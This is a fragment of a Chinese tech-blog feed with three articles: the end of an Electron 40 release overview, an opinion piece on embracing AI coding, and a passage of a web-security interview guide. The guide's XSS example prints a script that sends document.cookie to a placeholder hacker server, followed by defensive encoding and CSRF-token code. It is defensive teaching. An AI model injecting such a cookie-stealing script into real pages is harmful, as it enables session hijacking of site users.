</li>
</ol>
<h2 data-id="heading-20">未来展望</h2>
<p>Electron 团队将继续专注于跟上主要组件（Chromium、Node.js 和 V8）的开发进度，确保 Electron 应用能够使用最新的 Web 技术和性能优化。</p>
<p>从 Electron 39 到 40 的版本迭代可以看出，Electron 团队在保持稳定发布节奏的同时，也在不断引入新技术栈升级和新功能。特别是 Node.js 24 的升级，显示了 Electron 团队对最新技术的积极采用。开发者需要适应这种节奏，建立更灵活的升级和测试流程。</p>
<p>更多关于未来变更的信息可以在 Planned Breaking Changes 页面找到。</p>
<h2 data-id="heading-21">安装和使用</h2>
<p>可以通过以下方式安装 Electron 40.0.0：</p>
<pre><code class="hljs language-bash" lang="bash">npm install electron@latest
</code></pre>
<p>或者从 Electron 发布网站下载。</p>
<p>Electron 40.0.0 的发布标志着 Electron 生态系统的又一次重要进步。通过升级核心技术栈和引入新功能，Electron 继续为跨平台桌面应用开发提供强大的支持。虽然版本迭代速度较快可能会给开发者带来一些压力，但这也意味着能够更快地获得最新的技术和安全更新。开发者应该关注这些更新，特别是破坏性变更，以确保应用的稳定性和安全性。</p>
<p>对于刚刚熟悉 Electron 39 版本的开发者来说，40 版本的发布提供了一个很好的机会来评估是否需要升级，以及如何利用新版本的功能来改进应用。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【从古法编程到 AI Coding】跳出手写代码的陷阱]]></title>    <link>https://juejin.cn/post/7596991930985578547</link>    <guid>https://juejin.cn/post/7596991930985578547</guid>    <pubDate>2026-01-20T08:52:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596991930985578547" data-draft-id="7596698363963277350" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【从古法编程到 AI Coding】跳出手写代码的陷阱"/> <meta itemprop="keywords" content="前端,人工智能,Trae"/> <meta itemprop="datePublished" content="2026-01-20T08:52:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="pany"/> <meta itemprop="url" content="https://juejin.cn/user/2041120304148845"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【从古法编程到 AI Coding】跳出手写代码的陷阱
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2041120304148845/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    pany
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T08:52:08.000Z" title="Tue Jan 20 2026 08:52:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    179
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>简介：AI Coding 过程中沉淀的知识、技巧和感悟形成的零基础手摸手教程</p>
<p>作者：pany</p>
</blockquote>
<h2 data-id="heading-0">关于本专栏</h2>
<p><a href="https://juejin.cn/column/7596687515030192154" target="_blank" title="https://juejin.cn/column/7596687515030192154">从古法编程到 AI Coding</a> 专栏将用真实的开源项目实践演示，渐进式的带你的入门 AI Coding，从编程思维的转变、到 AI 辅助编程、再到 AI 结对编程、最后到 Vibe / Spec 编程，并且中间也会穿插着各种新工具的介绍与使用！</p>
<h2 data-id="heading-1">不想贩卖焦虑，但...</h2>
<p>没错，手写代码的时代已经结束了，或者说正在结束中，我们必须转变编程思维，跳出手写代码的陷阱...</p>
<p>这听上去似乎非常悲观，毕竟对传统开发者而言，舒适区正在瓦解。但<strong>与其在旧时代的残余中焦虑，不如主动拥抱 AI</strong>，在这个技术范式转移的时刻，找到自己新的生态位，避免被时代抛弃。</p>
<h2 data-id="heading-2">思想钢印</h2>
<p>作为这个专栏的开篇文章，我有想过直截了当的将自己的 AI IDE 实践分享出来，或是收集到的各种 AI Coding 的最新资讯。但是思来想去，我还是决定先尝试通过这第一篇文章，给我自己和作为读者的你打上一个思想钢印 <strong>「拥抱 AI」</strong></p>
<h2 data-id="heading-3">更高维的抽象</h2>
<p>整个软件工程历史，就是一个不断往更高维抽象的过程，离机器越来越远，离业务逻辑（自然语言）越来越近。</p>
<h3 data-id="heading-4">IDE 的发展历史</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4248d879242d46c18a1c4828954322ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcGFueQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769569029&amp;x-signature=eebIgZO640YJRv0bptvyPQ5ckTY%3D" alt="image.png" loading="lazy"/></p>
<p>IDE 的发展大致经历为一代文本编辑器/命令行，二代 Vim，三代 VSCode，这么一个过程。</p>
<p>这个演进过程有一个显著特征，就是 IDE 承载的脏活累活越来越多，而留给人类的只剩下核心决策。</p>
<p>按照这个逻辑，将 AI IDE 划分为第四代简直不要太完美，它不再仅仅是提示你怎么写，而是直接帮你审查、编写甚至初始化工程。<strong>它甚至不再是一个传统的工具，它在这一刻转变为了一个伙伴，一个结对编程对象或是一只聪明的小黄鸭。</strong></p>
<p>并且随着 AI 的愈发强大，将来所谓的 IDE 都将不复存在，留给大家的可能只有一个对话框，就像 TRAE SOLO 模式一样，已经在尽可能减少代码的曝光了：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/431c8ce52e0e4694a05b2345e896f6f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcGFueQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769569029&amp;x-signature=3W%2FvgUnTBAF7UWoY%2B1YVa5J8xDM%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-5">编程语言的发展历史</h3>
<p>同样的，编程语言的演变也是一部<strong>逃离底层，回归自然语言</strong>的进化史。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1bc40f5e07ce42708ee444427880e17d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcGFueQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769569029&amp;x-signature=M1QCXped6pQEfP4RCN1eL8xRUIk%3D" alt="image.png" loading="lazy"/></p>
<p>从最初晦涩难懂的 <strong>0101 机器码</strong>，到需要记忆繁琐指令的<strong>汇编语言</strong>，再到后来贴近人类逻辑的<strong>高级语言</strong>（如 C/C++、Java、Python、JavaScript）。每一代语言的迭代，都是在试图屏蔽底层的复杂度，让我们更专注于我要做什么，而不是电脑该怎么动。</p>
<p>而到了 AI Coding 时代，编程语言迎来了终极的抽象 <strong>「自然语言 Natural Language」</strong></p>
<p>我们不再需要纠结于语法糖、分号是不是漏写了，或者是 API 的具体参数是什么。<strong>Prompt 即代码，意图即实现。</strong> 这种维度的提升是降维打击式的，它将编程的门槛彻底抹平，让开发这件事回归到了最纯粹的逻辑构建与创造力本身。</p>
<h2 data-id="heading-6">思维的转变</h2>
<p>如果说 AI 是一股不可阻挡的浪潮，那么我觉得第一件事就是转变思维拥抱它。但是刚开始使用它的时候可能会进入一个陷阱，那就是 <strong>「太在意它写的代码」</strong></p>
<p>我就落入了这个陷阱。</p>
<p>我过度的在意了它写代码的完美性，甚至会在意它有没有按照我的想法来写代码。<strong>一旦它生成的代码不完美，我就会陷入 "改它不如自己写" 的焦躁中</strong>，就是这样导致我拥抱它拥抱的不够及时。</p>
<p>而让我跳出这个陷阱的契机就是一个思维的转变，<strong>从关注「代码」转变为关注「交付效率」</strong>。</p>
<p>对，核心是 <strong>「效率」</strong></p>
<p>只要 AI 写代码能帮我提高效率，我会允许自己忽略掉一些它的不足。并且一旦思维转变成功，后续所有的 AI Coding 过程都默默变得顺畅了起来。比如：</p>
<ul>
<li>不再逐行 Code Review，而是审查整体结构</li>
<li>不再过度纠结实现细节，而是校验逻辑是否合理</li>
<li>不再重点关注符不符合我的想法，而是关注有没有实现需求</li>
</ul>
<p>这时候会自然而然的进入终极阶段，那就是 <strong>「信任」</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb39890b840c415897ca27f7e6c735b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcGFueQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769569029&amp;x-signature=H6s8L%2F9uiqR70zinKptnkfa2EPk%3D" alt="image.png" loading="lazy"/></p>
<p>信任 AI 并不代表 AI 不会犯错，它就像一个靠谱的员工一样，值得领导将重要的事情交付给他，而领导只需要等待结果即可。</p>
<h2 data-id="heading-7">结语</h2>
<p>跳出陷阱，不仅仅是为了效率，更是为了给自己拿到一张通往未来的入场券。</p>
<p><strong>这一次，让我们换个姿势，继续编码未来。</strong></p>
<h2 data-id="heading-8">关注</h2>
<p>及时获取后续的文章更新 👇🏻</p>
<ul>
<li>公众号：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzE5MTYyOTQxNQ%3D%3D%26action%3Dgetalbum%26album_id%3D4350407594377658379%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzE5MTYyOTQxNQ==&amp;action=getalbum&amp;album_id=4350407594377658379#wechat_redirect" ref="nofollow noopener noreferrer">前往合集</a> 或关注作者 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fuser-attachments%2Fassets%2F529bac73-f9e3-4311-94d0-3db57216b771" target="_blank" title="https://github.com/user-attachments/assets/529bac73-f9e3-4311-94d0-3db57216b771" ref="nofollow noopener noreferrer">PanyCoding</a></li>
<li>掘金：<a href="https://juejin.cn/column/7596687515030192154" target="_blank" title="https://juejin.cn/column/7596687515030192154">前往专栏</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[面试官问网络安全，别再说"密码要设复杂点"了]]></title>    <link>https://juejin.cn/post/7597270795212013608</link>    <guid>https://juejin.cn/post/7597270795212013608</guid>    <pubDate>2026-01-20T12:13:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597270795212013608" data-draft-id="7587277503946850304" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="面试官问网络安全，别再说&quot;密码要设复杂点&quot;了"/> <meta itemprop="keywords" content="后端,前端"/> <meta itemprop="datePublished" content="2026-01-20T12:13:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员大华"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            面试官问网络安全，别再说"密码要设复杂点"了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员大华
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T12:13:07.000Z" title="Tue Jan 20 2026 12:13:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>有时候面试官可能会问网络安全的问题，他们不是想听你背定义，而是想知道：<strong>你写代码时，会不会多想这么一步</strong>。</p>
<p>我们来看下下面4个问题，或许可以让我们在面试时更加有底气。</p>
<h3 data-id="heading-0">1. XSS攻击：用户输入的内容，真的安全吗？</h3>
<p><strong>案例</strong>：小张做了一个评论功能，用户可以自由发表评论。他直接把用户输入的内容显示在网页上。结果某天，首页被挂上了赌博广告，网站被百度降权...</p>
<p><strong>发生了什么</strong>？<br/>
黑客在评论里输入了这样的内容：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-comment">// 窃取用户cookie</span>
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://黑客服务器.com/steal?cookie='</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>当其他用户看到这条评论时，这段代码自动执行，用户的登录信息就被偷走了！</p>
<p><strong>怎么防</strong>？<br/>
永远不要相信用户输入，对用户输入的内容，要做消毒处理：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 前端简单消毒函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sanitizeInput</span>(<span class="hljs-params">userInput</span>) {
  <span class="hljs-comment">// 创建一个临时div</span>
  <span class="hljs-keyword">const</span> tempDiv = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
  <span class="hljs-comment">// 把用户输入设为文本（不是HTML）</span>
  tempDiv.<span class="hljs-property">textContent</span> = userInput;
  <span class="hljs-comment">// 获取安全的HTML</span>
  <span class="hljs-keyword">return</span> tempDiv.<span class="hljs-property">innerHTML</span>;
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">const</span> comment = <span class="hljs-string">"&lt;script&gt;alert('hack')&lt;/script&gt;"</span>;
<span class="hljs-keyword">const</span> safeComment = <span class="hljs-title function_">sanitizeInput</span>(comment);
<span class="hljs-comment">// safeComment 变成 "&amp;lt;script&amp;gt;alert('hack')&amp;lt;/script&amp;gt;"</span>
<span class="hljs-comment">// 浏览器会原样显示，不会执行脚本</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 后端Java消毒（使用开源库）</span>
<span class="hljs-comment">// 先引入依赖：implementation 'org.owasp.encoder:encoder'</span>

<span class="hljs-keyword">import</span> org.owasp.encoder.Encode;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeHtml</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">userInput</span> <span class="hljs-operator">=</span> <span class="hljs-string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span>;
        <span class="hljs-comment">// 对HTML内容进行编码</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">safeOutput</span> <span class="hljs-operator">=</span> Encode.forHtmlContent(userInput);
        System.out.println(safeOutput);
        <span class="hljs-comment">// 输出：&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;</span>
    }
}
</code></pre>
<p><strong>面试小技巧</strong>：不要只说要过滤输入，而是说："我会对用户输入进行验证，对输出内容根据上下文进行编码，前后端双重防护。"</p>
<h3 data-id="heading-1">2. CSRF攻击</h3>
<p><strong>案例</strong>：小李做了一个银行转账功能，用户登录后可以转账。某天，有用户反映账户里的钱被转走了，但自己没操作过。调查发现，用户在登录状态下点击了一个恶意链接，就被悄悄转账了...</p>
<p><strong>发生了什么</strong>？<br/>
当你登录一个网站，浏览器会保存一个身份证明（Cookie）。黑客利用这一点，诱导你点击一个链接，这个链接会自动向银行网站发送转账请求。因为你的浏览器带着Cookie，银行以为是你自己操作的！</p>
<p><strong>怎么防</strong>？<br/>
最常用的方法是验证码（CSRF Token）：每个表单都有一个随机生成的验证码，服务器会验证这个码是否有效。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 表单中加入一个隐藏的token --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/transfer"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"csrf_token"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"随机字符串如a1b2c3d4e5"</span>&gt;</span>
  金额：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"amount"</span>&gt;</span>
  账号：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"to_account"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>转账<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 后端验证token</span>
<span class="hljs-meta">@PostMapping("/transfer")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">transferMoney</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String amount, 
                           <span class="hljs-meta">@RequestParam</span> String to_account,
                           <span class="hljs-meta">@RequestParam</span> String csrf_token,
                           HttpSession session)</span> {
    
    <span class="hljs-comment">// 从session获取正确的token</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">validToken</span> <span class="hljs-operator">=</span> (String) session.getAttribute(<span class="hljs-string">"csrf_token"</span>);
    
    <span class="hljs-comment">// 验证token</span>
    <span class="hljs-keyword">if</span> (!csrf_token.equals(validToken)) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"无效请求"</span>);
    }
    
    <span class="hljs-comment">// 执行转账</span>
    bankService.transfer(amount, to_account);
    <span class="hljs-keyword">return</span> <span class="hljs-string">"转账成功"</span>;
}
